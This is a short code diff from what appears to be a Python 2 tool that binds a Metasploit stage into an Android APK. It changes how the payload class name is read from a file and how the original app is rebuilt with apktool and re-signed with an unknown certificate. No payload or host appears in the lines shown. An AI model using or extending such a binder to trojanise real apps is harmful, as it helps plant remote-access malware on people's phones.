@@ -38,13 +38,10 @@ meta2 = out2 + '/smali/com/metasploit/stage/'
 NPAY = tmp + 'nampay.txt'
 
 
-def _CLS_RN_():
-    global CLS_RN
-    _CLS_RN = open(NPAY, "r")
-    if _CLS_RN == True:
-        CLS_RN = _CLS_RN.read()
-    else:
-        pass
+fname = open(NPAY)
+data_nam = fname.read()
+nam_pay = data_nam.split('\n', 1)[0]
+CLS_RN = os.path.splitext("{0}".format(nam_pay))[0]
 
 
 def _binder():
@@ -165,7 +162,7 @@ def _binder():
         shell=True)
     print "I: Compile original apk..."
     subprocess.call(
-        'apktool b ' + out1,
+        'apktool -a /usr/bin/aapt b ' + out1,
         shell=True)
     print "I: Signin unknown cert apk..."
     subprocess.call(
